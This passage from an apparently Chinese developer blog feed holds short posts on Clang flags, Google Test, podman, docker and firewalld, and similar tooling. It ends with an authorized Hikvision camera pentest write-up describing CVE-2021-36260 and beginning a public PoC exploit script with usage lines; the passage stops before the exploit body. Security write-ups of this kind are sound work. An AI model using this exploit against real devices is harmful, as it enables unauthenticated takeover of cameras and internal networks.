data-original="https://pic1.zhimg.com/80/v2-e7b70c4c60204dd895ab56026990dc7e_720w.webp?source=1940ef5c" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p>这里的重点是：</p><ol type="1"><li>标签数量减少。</li><li>使用了 lea（加载有效地址）和 jne（跳转不等于）等高效指令</li><li>如果 eax 为 0，比较和跳出循环以标记 LBB0_3 等步骤已完全跳过。</li></ol><ul><li>注意：我在 example1.cpp 上进一步试验了 Clang 优化标志 -O2 和-Os。以下是空间缩减的列表，供大家快速对比：</li></ul><p>-O0 244,224 bytes -O1 236,032 bytes -O2 233,984 bytes -Os 231,424bytes -Oz 229,376 bytes 可以看出，在从 -O0（无优化）到-Oz（积极的空间优化）的过程中，<a href="https://www.zhihu.com/search?q=可执行文件&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A3105870528%7D">可执行文件</a>大小逐渐减小。尽管我没有对其进行测量，但可以确定的是，在这些阶段，<a href="https://link.zhihu.com/?target=https%3A//www.incredibuild.cn/product/dev-acceleration%3Futm_source%3Dcsdn%26utm_medium%3Dsocial%26utm_campaign%3Dblog_post_083021">编译时间</a>也在逐渐增加。</p><h3 id="深入分析"><strong>深入分析</strong></h3><p>如果没有实际去操作，可能很难分析汇编代码。阅读（而不是编写）汇编代码是我真心推荐给所有开发人员的一项学习技能。请放心，Clang/LLVM有一个开关，描述了编译运行期间使用的具体优化：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">clang <span class="token operator">-</span>O3 <span class="token operator">-</span>foptimization<span class="token operator">-</span>record<span class="token operator">-</span>file<span class="token operator">=</span>Opt<span class="token punctuation">.</span>txt Example1<span class="token punctuation">.</span>cpp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Opt.txt 文件将包含所有优化的详细信息。你将获得如下条目：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token operator">--</span><span class="token operator">-</span> <span class="token operator">!</span>AnalysisPass<span class="token operator">:</span>            prologepilogName<span class="token operator">:</span>            StackSizeDebugLoc<span class="token operator">:</span>        <span class="token punctuation">{</span> File<span class="token operator">:</span> Example1<span class="token punctuation">.</span>cpp<span class="token punctuation">,</span> Line<span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span> Column<span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span>Function<span class="token operator">:</span>        '<span class="token operator">?</span>ConvertStringToPasswordForm@@YAXQEAD@Z<span class="token number">'</span>Args<span class="token operator">:</span><span class="token operator">-</span> NumStackBytes<span class="token operator">:</span>   <span class="token char">'0'</span><span class="token operator">-</span> String<span class="token operator">:</span>          <span class="token char">' stack bytes in function'</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 LLVM中，实现优化是通过程序的某些部分来收集信息或转换程序的过程。在上述条目中，通行证名称为“prologepilog”。你可以从线上的参考资料中获得不同编译器开关的完整信息：<a href="https://link.zhihu.com/?target=https%3A//clang.llvm.org/docs/ClangCommandLineReference.html%20.">https://clang.llvm.org/docs/ClangCommandLineReference.html.</a></p><p>你还可以运行 clang–help 或 clang–help hidden获得联机帮助。有一个隐藏的帮助功能，介绍了所有可用的高级开关！</p><h3 id="clang-优化标志我们还没完成"><strong>Clang优化标志，我们还没完成！</strong></h3><p>Clang 的核心是 LLVM。因此如果不介绍如何使用 LLVM 中间语言， Clang优化标志的文章是不完整的。以下是如何获取中间语言字节码的方式：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">clang <span class="token operator">-</span>c <span class="token operator">-</span>O1 <span class="token operator">-</span>emit<span class="token operator">-</span>llvm Example1<span class="token punctuation">.</span>cpp <span class="token operator">-</span>o Example<span class="token punctuation">.</span>bc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一般来说，LLVM <a href="https://www.zhihu.com/search?q=字节码文件&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A3105870528%7D">字节码文件</a>的扩展名为.bc。要进一步使用字节码文件，你需要借助一些工具，这些工具是 Clang/LLVM安装程序没有提供的。</p><p>首先，点击链接<a href="https://link.zhihu.com/?target=https%3A//github.com/llvm/llvm-project/releases/tag/llvmorg-12.0.0">下载LLVM 源代码</a>。提取源代码并存储到名为 <a href="https://www.zhihu.com/search?q=llvm-project-llvmorg-12.0.0&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A3105870528%7D">llvm-project-llvmorg-12.0.0</a>的文件夹中。在 llvm-project-llvmorg-12.0.0下创建一个名为 build的文件夹，这个步骤需要提前安装 python。</p><p>现在你可以使用 CMake 了，如果你还不了解什么是 CMake ，<a href="https://link.zhihu.com/?target=https%3A//www.incredibuild.cn/integrations/cmake%3Futm_source%3Dcsdn%26utm_medium%3Dsocial%26utm_campaign%3Dblog_post_083021">请点击阅读</a>。</p><p>下面，我将展示 LLVM tools 文件夹中一个名为 opt的工具。要从源代码处编译此文件，请使用以下命令：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">cd buildcmake <span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">-</span>DLLVM_TARGETS_TO_BUILD<span class="token operator">=</span>X86cmake <span class="token operator">--</span>build <span class="token punctuation">.</span> <span class="token operator">-</span>t opt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>记住，这不是一个快速构建。在获得 <a href="https://www.zhihu.com/search?q=opt.exe&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A3105870528%7D">opt.exe</a>最终工件之前，需要构建 92 个依赖库。你可以利用 opt.exe打印帮助，并且可以查看 LLVM支持的所有优化。以下是你将获得的部分信息：</p><figure><img src="https://googles.plus/images/loading.gif" data-original="https://picx.zhimg.com/80/v2-1d93b4328f040ef407f03fb758901c3e_720w.webp?source=1940ef5c" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><h3 id="总结"><strong>总结</strong></h3><p>文章即将结束，我需要反思一下，是否本文已经达到了我设定的目标，大家理解了Clang <a href="https://www.zhihu.com/search?q=优化标志&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A3105870528%7D">优化标志</a>的用法了吗？我相信我已经说清楚了。Clang/LLVM并不是一个趣味性工具，而是有其实际的功能。理解开发中的基本工具——编译器——及其行为，对开发新手的成长来说至关重要。作为程序员，你需要了解改变编译输出的Clang 编译器标志。当然，如果你已经编写了 LLVM 优化过程，而且开始使用LLVM 进行静态代码分析，或者对<a href="https://www.zhihu.com/search?q=全局值编号&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A3105870528%7D">全局值编号</a>（GlobalValueNumbering）有了深入地了解，那么你已经是大师级的程序员了！我也为你的成绩感到骄傲！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>在 C++ 项目中使用 Google Test &amp; Benchmark</title>
      <link href="/2023/07/19/zai-c-xiang-mu-zhong-shi-yong-google-test-benchmark/"/>
      <url>/2023/07/19/zai-c-xiang-mu-zhong-shi-yong-google-test-benchmark/</url>
      
        <content type="html"><![CDATA[<h2 id="编译安装">编译安装</h2><p>Google Test/Benchmark 是基于 CMake构建的。跨平台支持非常的好，Windows 可以使用 nmake 编译安装，默认会在<code>Program Files</code> 目录下创建包含库和头文件的 benchmark文件夹。</p><p>具体过程可以参考：https://learn.microsoft.com/en-us/visualstudio/test/how-to-use-google-test-for-cpp</p><p>轻量级的单元测试可以使用微软内置的测试框架：https://learn.microsoft.com/en-us/visualstudio/test/how-to-use-microsoft-test-framework-for-cpp</p><h3 id="相关报错">相关报错</h3><p><code>error LNK2001: unresolved external symbol __CxxFrameHandler4 and __GSHandlerCheck_EH4</code></p><p>这个是因为编译 benchmark 库和项目的 msvc工具链的版本不一样导致的，Visual Studio 这一侧的版本很好切换，CMake那面使用参数 <code>-G "Visual Studio 15 2017 Win64"</code> 切换。</p><blockquote><p>https://stackoverflow.com/questions/66151081/error-lnk2001-unresolved-external-symbol-cxxframehandler4-and-gshandlerchec</p></blockquote><p><code>LINK : warning LNK4217: Symbol"?PrintDefaultHelp@benchmark@@YAXXZ ...</code></p><p>如果是 benchmark 自己的符号 importa 失败了，有可能是没有定义<code>BENCHMARK_STATIC_DEFINE</code>.</p><blockquote><p>https://github.com/google/benchmark/issues/1450</p></blockquote><h2 id="基本使用">基本使用</h2><blockquote><p>https://www.cnblogs.com/coderzh/archive/2009/04/11/1433744.html</p></blockquote><p>Google Benchmark 的前端主要用宏来实现，比较轻巧。</p><h3 id="test">Test</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"pch.h"</span></span><span class="token keyword">constexpr</span> <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token function">TEST</span><span class="token punctuation">(</span>TestCaseOps<span class="token punctuation">,</span> TestAdd<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">EXPECT_EQ</span><span class="token punctuation">(</span><span class="token function">bitAdd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">,</span> a <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">TEST</span><span class="token punctuation">(</span>TestCaseOps<span class="token punctuation">,</span> TestSub<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">EXPECT_EQ</span><span class="token punctuation">(</span><span class="token function">bitSub</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">,</span> a <span class="token operator">-</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">TEST</span><span class="token punctuation">(</span>TestCaseOps<span class="token punctuation">,</span> TestMul<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">EXPECT_EQ</span><span class="token punctuation">(</span><span class="token function">bitMul</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">,</span> a <span class="token operator">*</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">EXPECT_EQ</span><span class="token punctuation">(</span><span class="token function">bitMul</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> a <span class="token operator">*</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">EXPECT_EQ</span><span class="token punctuation">(</span><span class="token function">bitMul</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token operator">*</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">TEST</span><span class="token punctuation">(</span>TestCaseOps<span class="token punctuation">,</span> TestDiv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">EXPECT_EQ</span><span class="token punctuation">(</span><span class="token function">bitDiv</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">,</span> a <span class="token operator">/</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">EXPECT_EQ</span><span class="token punctuation">(</span><span class="token function">bitDiv</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">EXPECT_EQ</span><span class="token punctuation">(</span><span class="token function">bitDiv</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x7fffffff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">EXPECT_EQ</span><span class="token punctuation">(</span><span class="token function">bitDiv</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0x80000000</span>i32<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">EXPECT_EQ</span><span class="token punctuation">(</span><span class="token function">bitDiv</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token double-colon punctuation">::</span>testing<span class="token double-colon punctuation">::</span><span class="token function">InitGoogleTest</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">RUN_ALL_TESTS</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="benchmark">Benchmark</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;benchmark/benchmark.h&gt;</span></span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">BM_StringCreation</span><span class="token punctuation">(</span>benchmark<span class="token double-colon punctuation">::</span>State <span class="token operator">&amp;</span>state<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> _ <span class="token operator">:</span> state<span class="token punctuation">)</span>        std<span class="token double-colon punctuation">::</span>string empty_string<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">BENCHMARK</span><span class="token punctuation">(</span>BM_StringCreation<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">BM_StringCopy</span><span class="token punctuation">(</span>benchmark<span class="token double-colon punctuation">::</span>State <span class="token operator">&amp;</span>state<span class="token punctuation">)</span> <span class="token punctuation">{</span>    std<span class="token double-colon punctuation">::</span>string x <span class="token operator">=</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> _ <span class="token operator">:</span> state<span class="token punctuation">)</span>        std<span class="token double-colon punctuation">::</span>string <span class="token function">copy</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">BENCHMARK</span><span class="token punctuation">(</span>BM_StringCopy<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">BENCHMARK_MAIN</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><figure><img src="https://googles.plus/images/loading.gif" data-original="\images\在-C-项目中使用-Google-Test-Benchmark\image-20230719104135019.png" alt="image-20230719104135019"><figcaption aria-hidden="true">image-20230719104135019</figcaption></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GraalVM 编译期引用 msvc</title>
      <link href="/2023/06/27/graalvm-bian-yi-qi-yin-yong-msvc/"/>
      <url>/2023/06/27/graalvm-bian-yi-qi-yin-yong-msvc/</url>
      
        <content type="html"><![CDATA[<p>使用 GraalVM JDK 中的 <code>native-image</code>编译原生应用时，如果使用 jabba 之类的 SDK管理器的话，环境变量管理可能会与 Visual Studio的开发人员工具环境起冲突，无法同时共用两个。</p><p>可以在 GraalVM 的工具路径中找到 <code>native-image.cmd</code>，手动引入 MSVC 的编译工具集。</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">@echo offcall "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat" &gt; nul<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>vcvars64.bat</code> 的路径视本地情况决定。</p><p>https://stackoverflow.com/questions/64197329/cl-exe-missing-when-building-native-app-using-graalvm</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>去除 Google 搜索结果重定向</title>
      <link href="/2023/06/15/qu-chu-google-sou-suo-jie-guo-chong-ding-xiang/"/>
      <url>/2023/06/15/qu-chu-google-sou-suo-jie-guo-chong-ding-xiang/</url>
      
        <content type="html"><![CDATA[<ol type="1"><li>安装 https://ublockorigin.com/</li><li>开启 <code>uBlock filters - Annoyances</code></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>podman 容器作为服务管理</title>
      <link href="/2023/06/11/podman-rong-qi-zuo-wei-fu-wu-guan-li/"/>
      <url>/2023/06/11/podman-rong-qi-zuo-wei-fu-wu-guan-li/</url>
      
        <content type="html"><![CDATA[<h2 id="创建服务配置">创建服务配置</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 创建配置，打印到 stdout</span><span class="token function">podman</span> generate systemd <span class="token parameter variable">--new</span> <span class="token parameter variable">--name</span> <span class="token string">"<span class="token variable">$CONTAINER_NAME</span>"</span><span class="token comment"># 复制到 User-scope 的服务配置</span><span class="token function">mkdir</span> <span class="token parameter variable">-p</span> ~/.config/systemd/user/<span class="token function">mv</span> <span class="token parameter variable">-v</span> <span class="token string">"container-<span class="token variable">$CONTAINER_NAME</span>.service"</span> ~/.config/systemd/user/<span class="token comment"># Reload 配置并启用</span>systemctl <span class="token parameter variable">--user</span> daemon-reloadsystemctl <span class="token parameter variable">--user</span> <span class="token builtin class-name">enable</span> <span class="token string">"container-<span class="token variable">$CONTAINER_NAME</span>.service"</span><span class="token comment"># 查看状态</span>systemctl <span class="token parameter variable">--user</span> status <span class="token string">"container-<span class="token variable">$CONTAINER_NAME</span>.service"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考">参考</h2><ul><li>https://www.tutorialworks.com/podman-systemd/</li><li>https://github.com/containers/podman/issues/10539</li><li>https://askubuntu.com/questions/676007/how-do-i-make-my-systemd-service-run-via-specific-user-and-start-on-boot</li><li>https://stackoverflow.com/questions/65162259/is-there-a-possibility-to-change-restart-policy-of-podman-container</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 云原生 </tag>
            
            <tag> podman </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sudo 中的 alias</title>
      <link href="/2023/06/11/sudo-zhong-de-alias/"/>
      <url>/2023/06/11/sudo-zhong-de-alias/</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.gnu.org/software/bash/manual/bashref.html#Aliases">BashManaul</a> 中写到：</p><blockquote><p>Aliases allow a string to be substituted for a word when it is usedas the first word of a simple command. The shell maintains a list ofaliases that may be set and unset with the alias and unalias builtincommands.</p><p><strong>The first word of each simple command, if unquoted, ischecked to see if it has an alias</strong>. If so, that word is replacedby the text of the alias. The characters ‘/’, ‘$’, ‘`’, ‘=’ and any ofthe shell metacharacters or quoting characters listed above may notappear in an alias name. The replacement text may contain any validshell input, including shell metacharacters. The first word of thereplacement text is tested for aliases, but a word that is identical toan alias being expanded is not expanded a second time. This means thatone may alias ls to "ls -F", for instance, and Bash does not try torecursively expand the replacement text. <strong>If the last characterof the alias value is a space or tab character, then the next commandword following the alias is also checked for aliasexpansion</strong>.</p></blockquote><p>只会检查命令中第一个单词，对其进行 alias 处理。</p><p>alias sudo='sudo '，可绕过命令中的空格，与后面的指令进行拼接。</p><h2 id="refer">Refer</h2><ul><li>https://askubuntu.com/questions/22037/aliases-not-available-when-using-sudo</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>人类从历史中学到的唯一教训</title>
      <link href="/2023/06/09/ren-lei-cong-li-shi-zhong-xue-dao-de-wei-yi-jiao-xun/"/>
      <url>/2023/06/09/ren-lei-cong-li-shi-zhong-xue-dao-de-wei-yi-jiao-xun/</url>
      
        <content type="html"><![CDATA[<h3 id="原文">原文</h3><p>But what experience and history teach is this – that nations andgoverments have never learned anything from history or acted upon anylessons they might have drawn from it.</p><h3 id="翻译">翻译</h3><p>人类从历史中学到的唯一教训，就是人类无法从历史中学到任何教训。</p><h3 id="出处">出处</h3><p>《历史哲学 (The Philosophy ofHistory)》绪论，格奥尔格·威廉·弗里德里希·黑格尔 (Georg Wilhelm FriedrichHegel, 1770 ~ 1831) 是一名德国哲学家。其时代晚于康德，是德国 19世纪唯心论哲学的代表人物之一。</p><p>一般认为，黑格尔的思想，标志着19世纪德国唯心主义哲学运动的顶峰，对后世哲学流派，如存在主义，马克思的历史唯物主义，法西斯主义以及历史虚无主义都产生了深远的影响。</p><h3 id="解读">解读</h3><p>这句话有两种截然不同的意思：</p><ol type="1"><li>人无法两次踏入同一条河流，我们在不同的时间，遇到不同的问题，所以无法遵循历史给我们的教训。</li><li>太阳底下并无新事，一切都是循环往复，但由于人贪婪、短视、健忘的本性，我们无法从历史中汲取任何教训。</li></ol><p>前者是作者的原意，而后者是我们大多数人的理解。</p><p>我想，这两者可能都是对的。</p><p>前者说，世界永远都在变化，我们永远都不会遇见完全相同的情况，像奔腾的河流，一去不还；后者说，因为自然的法则和人性永恒不变，这变化的本身有着一定的规律，像滚滚的车轮，往复循环。</p><p>前者是随机性，后者是确定性，也许世界就是在这两种力量的交织下不断发展，如同战车的两个车轮，滚滚向前。</p><p>我们记录下沿途的车辙，然后称之为历史。</p><h3 id="总结">总结</h3><p>面对随机性，实事求是，不纠结于过去；面对确定性，理解规律，以历史为老师。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>docker 容器端口绕过 firewalld 防火墙解决方案</title>
      <link href="/2023/05/18/docker-rong-qi-duan-kou-rao-guo-firewalld-fang-huo-qiang-jie-jue-fang-an/"/>
      <url>/2023/05/18/docker-rong-qi-duan-kou-rao-guo-firewalld-fang-huo-qiang-jie-jue-fang-an/</url>
      
        <content type="html"><![CDATA[<h1 id="docker-容器端口绕过-firewalld-防火墙解决方案">docker容器端口绕过 firewalld 防火墙解决方案</h1><h2 id="docker-不使用-iptables">docker 不使用 iptables</h2><p>在 <code>/etc/docker/daemon.json</code> 文件中添加<code>"iptables": false</code></p><p>刷新服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl daemon-reload<span class="token function">sudo</span> systemctl restart <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="exec-参数">Exec 参数</h2><p>如果在使用这种方法之前已经启用的 docker 容器, 仍然不受 firewalld控制</p><pre class="line-numbers language-none"><code class="language-none"># 修改 /usr/lib/systemd/system/docker.servicevi /usr/lib/systemd/system/docker.service# 找到 ExecStart=/usr/bin/dockerd -H tcp://127.0.0.1:2375 -H unix://var/run/docker.sock在中间添加--iptables=false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改后 :</p><pre class="line-numbers language-none"><code class="language-none">ExecStart=/usr/bin/dockerd --iptables=false -H tcp://127.0.0.1:2375 -H unix://var/run/docker.sock<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl daemon-reload<span class="token function">sudo</span> systemctl restart <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Oracle SQL Developer 美化</title>
      <link href="/2023/04/24/oracle-sql-developer-mei-hua/"/>
      <url>/2023/04/24/oracle-sql-developer-mei-hua/</url>
      
        <content type="html"><![CDATA[<p>配置目录 <code>\sqldeveloper\bin\sqldeveloper.conf</code>, Linux 在<code>/opt/sqldeveloper/sqldeveloper/bin/sqldeveloper.conf</code></p><pre class="line-numbers language-none"><code class="language-none"># 设置界面为英文AddVMOption -Duser.language=enAddVMOption -Duser.country=US# 设置界面字体为微软雅黑AddVMOption -Dswing.plaf.metal.controlFont=Microsoft YaHei UIAddVMOption -Dswing.plaf.metal.userFont=Microsoft YaHei UIAddVMOption -Dswing.plaf.metal.systemFont=Microsoft YaHei UIAddVMOption -Dswing.plaf.metal.smallFont=Microsoft YaHei UI<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>UI 缩放</p><pre class="line-numbers language-none"><code class="language-none">AddVMOption -Dsun.java2d.uiScale=2AddVMOption -Dsun.java2d.uiScale.enabled=true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在 <code>.sqldeveloper</code> 中：</p><pre class="line-numbers language-none"><code class="language-none">Ide.FontSize.zh=14<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>https://stackoverflow.com/questions/50138830/how-to-increase-size-of-gui-font-everything-of-oracle-sql-developer-18-1</p><p>https://dbaportal.eu/2013/12/16/how-to-fix-default-ugly-fonts-in-sql-developer-on-linux/</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次 Hikvision Pentest</title>
      <link href="/2023/04/24/ji-yi-ci-hikvision-pentest/"/>
      <url>/2023/04/24/ji-yi-ci-hikvision-pentest/</url>
      
        <content type="html"><![CDATA[<h2 id="前情提要">前情提要</h2><p>在经允许和授权的前提下，对内网的摄像机进行了渗透测试。海康威视旗下的摄像头几乎都存在着严重的安全漏洞，在学校和政府机关中有数百上千个。但除了安全意识较强的公安系统控制的摄像头以外，其他场所的摄像头往往并不注重于固件更新，使用的几乎都是2020年前的固件。这些版本都存在着两个严重的漏洞：<strong>CVE-2021-36260</strong>,<strong>CVE-2017-7921</strong>.</p><h2 id="cve-2021-36260">CVE-2021-36260</h2><h3 id="漏洞概述">漏洞概述</h3><blockquote><p>https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html</p></blockquote><p>海康威视摄像机最近的大多数摄像机产品系列都容易受到严重的远程未经身份验证的代码执行漏洞的影响。一些NVR 也受到影响，尽管这种影响不那么普遍。</p><p>CVE-2021-36260 漏洞允许攻击者通过不受限制的 root shell(<code>/bin/sh</code>)获得对设备的完全控制，这比设备所有者拥有的访问权限要多得多，因为他们被限制在有限的“受保护的shell”（<code>/bin/psh</code>）中，它将输入过滤到预定义的集合有限的，主要是信息性命令。</p><p>除了完全入侵 IP 摄像头之外，还可以访问和攻击内部网络。</p><p>这是最高级别的严重漏洞。一个影响大量海康威视摄像机的零点击未经身份验证的远程代码执行(RCE) 漏洞。</p><p>只需要访问 http(s) 服务器端口（通常为80/443）。不需要用户名或密码，也不需要由相机所有者发起任何操作。它不会被相机本身的任何日志检测到。</p><h3 id="poc">PoC</h3><p>公开 PoC.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Exploit Title: Hikvision Web Server Build 210702 - Command Injection</span><span class="token comment"># Exploit Author: bashis</span><span class="token comment"># Vendor Homepage: https://www.hikvision.com/</span><span class="token comment"># Version: 1.0</span><span class="token comment"># CVE: CVE-2021-36260</span><span class="token comment"># Reference: https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html</span><span class="token comment"># All credit to Watchful_IP</span><span class="token comment">#!/usr/bin/env python3</span><span class="token triple-quoted-string string">"""Note:1)  This code will _not_ verify if remote is Hikvision device or not.2)  Most of my interest in this code has been concentrated on how to    reliably detect vulnerable and/or exploitable devices.    Some devices are easy to detect, verify and exploit the vulnerability,    other devices may be vulnerable but not so easy to verify and exploit.    I think the combined verification code should have very high accuracy.3)  'safe check' (--check) will try write and read for verification    'unsafe check' (--reboot) will try reboot the device for verification[Examples]Safe vulnerability/verify check:    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --checkSafe and unsafe vulnerability/verify check:(will only use 'unsafe check' if not verified with 'safe check')    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check --rebootUnsafe vulnerability/verify check:    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 